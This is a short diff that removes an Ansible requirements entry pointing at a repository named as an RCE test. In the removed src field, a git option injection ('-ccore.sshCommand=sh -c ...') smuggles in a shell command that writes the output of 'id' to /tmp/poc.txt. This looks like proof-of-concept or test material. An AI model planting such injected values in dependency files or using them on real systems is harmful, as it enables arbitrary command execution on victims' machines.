@@ -1,3 +1,0 @@
-- name: git@github.com:s4cript/Test-RCE-ansible-automation-.git
-  src: -ccore.sshCommand=sh -c "id > /tmp/poc.txt; echo vulnerable"
-  scm: git
